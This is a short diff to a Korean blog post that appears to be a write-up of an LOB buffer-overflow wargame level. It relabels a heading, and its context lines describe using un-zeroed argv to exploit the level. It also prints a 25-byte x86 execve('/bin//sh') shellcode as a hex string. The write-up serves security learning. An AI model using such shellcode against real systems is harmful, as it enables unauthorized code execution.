@@ -93,7 +93,7 @@ main(int argc, char *argv[])
 **[LOB(level4)](https://limjunho.github.io/2019/11/03/LOB-level4(goblin).html)와 같이 argv[2]를 이용하는 방법이 있다.**  
 **이 포스팅에서는 buffer는 초기화하지만 argv는 초기화 하지 않는 취약점을 이용해 풀이**  
 
-#### level4에서 사용한 쉘코드  
+#### level6에서 사용한 쉘코드  
 **\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80**
 이전에 사용하던 41Byte 쉘코드는 buffer의 크기가 작아 사용하기 어렵기 때문에 25Byte 쉘코드를 사용  
 
